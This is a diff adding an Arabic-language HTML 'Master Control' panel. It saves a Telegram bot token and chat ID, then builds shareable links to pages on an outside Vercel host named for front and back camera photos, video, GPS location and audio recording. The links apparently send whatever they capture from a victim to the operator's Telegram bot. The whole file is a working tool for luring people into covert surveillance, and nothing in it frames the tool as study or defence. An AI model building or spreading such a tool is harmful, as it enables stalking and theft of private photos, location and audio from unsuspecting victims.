@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ Master Control</title>
+    <style>
+        :root { --green: #00ff41; --red: #ff0040; --gold: #ffaa00; }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family: 'Courier New', monospace; background: #000; color: #fff; min-height: 100vh; padding: 20px; }
+        @keyframes flicker { 0%,100%{opacity:1} 50%{opacity:0.3} }
+        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.05)} }
+        .container { max-width: 450px; margin: 0 auto; }
+        .page { display: none; } .page.active { display: block; }
+        
+        .login-box { text-align: center; padding-top: 20px; }
+        .skull { font-size: 50px; animation: pulse 0.5s infinite; }
+        h1 { font-size: 20px; color: var(--green); text-shadow: 0 0 20px var(--green); margin: 8px 0; }
+        .subtitle { color: #333; font-size: 10px; letter-spacing: 2px; margin-bottom: 20px; }
+        
+        .input-group { margin-bottom: 12px; text-align: right; }
+        .input-group label { color: #555; font-size: 11px; display: block; margin-bottom: 4px; }
+        .input-group input {
+            width: 100%; padding: 14px; border-radius: 8px;
+            border: 2px solid #1a1a1a; background: #0a0a0a;
+            color: var(--green); font-size: 14px; text-align: left;
+            font-family: 'Courier New', monospace; outline: none;
+        }
+        .input-group input:focus { border-color: var(--green); }
+        
+        .btn {
+            width: 100%; padding: 16px; border-radius: 10px;
+            border: 2px solid var(--green); background: #0a1a0a;
+            color: var(--green); font-size: 16px; font-weight: 700;
+            cursor: pointer; font-family: 'Courier New', monospace;
+            text-shadow: 0 0 10px var(--green);
+            box-shadow: 0 0 20px rgba(0,255,65,0.2); margin-top: 8px;
+            animation: flicker 0.8s infinite;
+        }
+        .btn:active { background: #0a2a0a; }
+        .btn.gold { border-color: var(--gold); color: var(--gold); background: #1a1a00; text-shadow: 0 0 10px var(--gold); }
+        
+        .tools-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 16px; }
+        .tool-card {
+            background: #0a0a0a; border: 2px solid var(--green);
+            border-radius: 12px; padding: 16px; text-align: center;
+            cursor: pointer; transition: 0.2s;
+            box-shadow: 0 0 20px rgba(0,255,65,0.2);
+        }
+        .tool-card:active { background: #0a2a0a; }
+        .tool-card .icon { font-size: 30px; }
+        .tool-card .name { color: var(--green); font-size: 12px; font-weight: 700; margin-top: 6px; }
+        
+        .link-box {
+            background: #0a1a0a; border: 2px solid var(--gold);
+            border-radius: 10px; padding: 14px; margin: 16px 0;
+            word-break: break-all; color: var(--gold);
+            font-size: 11px; cursor: pointer;
+            box-shadow: 0 0 20px rgba(255,170,0,0.3);
+        }
+        
+        .copy-toast {
+            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+            background: #0a1a0a; border: 2px solid var(--gold);
+            color: var(--gold); padding: 12px 24px; border-radius: 10px;
+            font-size: 14px; font-weight: 700; z-index: 1000;
+        }
+        
+        .back-btn {
+            background: none; border: 1px solid #333;
+            color: #555; padding: 8px 16px; border-radius: 6px;
+            cursor: pointer; font-family: 'Courier New', monospace;
+            margin-bottom: 16px; font-size: 11px;
+        }
+        
+        .save-badge {
+            display: inline-block; background: #0a1a0a; border: 1px solid var(--green);
+            color: var(--green); padding: 4px 10px; border-radius: 6px;
+            font-size: 10px; margin-bottom: 12px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    
+    <!-- صفحة الإعدادات -->
+    <div class="page active" id="page-setup">
+        <div class="login-box">
+            <div class="skull">⚡</div>
+            <h1>Master Control</h1>
+            <div class="subtitle">━ SETUP YOUR BOT ━</div>
+            
+            <div class="input-group">
+                <label>🤖 BOT TOKEN</label>
+                <input type="text" id="bot-token" placeholder="123456:ABC-DEF1234ghikl">
+            </div>
+            <div class="input-group">
+                <label>🆔 CHAT ID</label>
+                <input type="text" id="chat-id" placeholder="7276604783">
+            </div>
+            
+            <button class="btn" onclick="saveAndContinue()">💾 حفظ ودخول</button>
+            <div class="save-badge" style="margin-top:8px;" id="saved-badge"></div>
+        </div>
+    </div>
+    
+    <!-- لوحة الأدوات -->
+    <div class="page" id="page-tools">
+        <button class="back-btn" onclick="showPage('page-setup')">← تغيير الإعدادات</button>
+        <div class="skull" style="text-align:center;">🛡️</div>
+        <h1 style="text-align:center;">أدوات التحكم</h1>
+        
+        <div class="tools-grid">
+            <div class="tool-card" onclick="generateLink('photo-front.html', '📸 صور أمامية')">
+                <div class="icon">📸</div><div class="name">10 صور أمامية</div>
+            </div>
+            <div class="tool-card" onclick="generateLink('photo-back.html', '📸 صور خلفية')">
+                <div class="icon">📸</div><div class="name">10 صور خلفية</div>
+            </div>
+            <div class="tool-card" onclick="generateLink('mm.html', '🎬 فيديو أمامي')">
+                <div class="icon">🎬</div><div class="name">فيديو أمامي</div>
+            </div>
+            <div class="tool-card" onclick="generateLink('video-back.html', '🎬 فيديو خلفي')">
+                <div class="icon">🎬</div><div class="name">فيديو خلفي</div>
+            </div>
+            <div class="tool-card" onclick="generateLink('location.html', '📍 موقع')">
+                <div class="icon">📍</div><div class="name">GPS موقع</div>
+            </div>
+            <div class="tool-card" onclick="generateLink('audio.html', '🎤 صوت')">
+                <div class="icon">🎤</div><div class="name">تسجيل صوت</div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- صفحة الرابط -->
+    <div class="page" id="page-link">
+        <button class="back-btn" onclick="showPage('page-tools')">← رجوع</button>
+        <div style="text-align:center;">
+            <div class="skull">🔗</div>
+            <h1 id="link-title">الرابط جاهز</h1>
+            <div class="link-box" id="link-box" onclick="copyLink()"></div>
+            <p style="color:#333;font-size:10px;">اضغط على الرابط لنسخه</p>
+        </div>
+    </div>
+
+</div>
+
+<script>
+const BASE = 'https://ai-proxy-eosin.vercel.app';
+let botToken = '', chatId = '';
+
+// تحميل الإعدادات المحفوظة
+const saved = JSON.parse(localStorage.getItem('master_setup') || '{}');
+if (saved.token && saved.chatId) {
+    botToken = saved.token;
+    chatId = saved.chatId;
+    document.getElementById('bot-token').value = botToken;
+    document.getElementById('chat-id').value = chatId;
+    document.getElementById('saved-badge').textContent = '✅ تم التحميل - ' + chatId;
+}
+
+function showPage(id) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); }
+
+function saveAndContinue() {
+    botToken = document.getElementById('bot-token').value.trim();
+    chatId = document.getElementById('chat-id').value.trim();
+    
+    if (!botToken || !chatId) return alert('اكتب التوكن والـ Chat ID');
+    
+    localStorage.setItem('master_setup', JSON.stringify({ token: botToken, chatId }));
+    document.getElementById('saved-badge').textContent = '✅ محفوظ - ' + chatId;
+    showPage('page-tools');
+}
+
+function generateLink(page, name) {
+    if (!botToken || !chatId) return alert('احفظ الإعدادات الأول');
+    
+    const link = `${BASE}/${page}?chatId=${chatId}&token=${botToken}`;
+    document.getElementById('link-title').textContent = '🔗 ' + name;
+    document.getElementById('link-box').textContent = link;
+    showPage('page-link');
+}
+
+function copyLink() {
+    const link = document.getElementById('link-box').textContent;
+    navigator.clipboard.writeText(link).then(() => {
+        const toast = document.createElement('div');
+        toast.className = 'copy-toast';
+        toast.textContent = '✅ تم النسخ!';
+        document.body.appendChild(toast);
+        setTimeout(() => toast.remove(), 2000);
+    }).catch(() => alert('تم نسخ الرابط: ' + link));
+}
+</script>
+</body>
+</html>
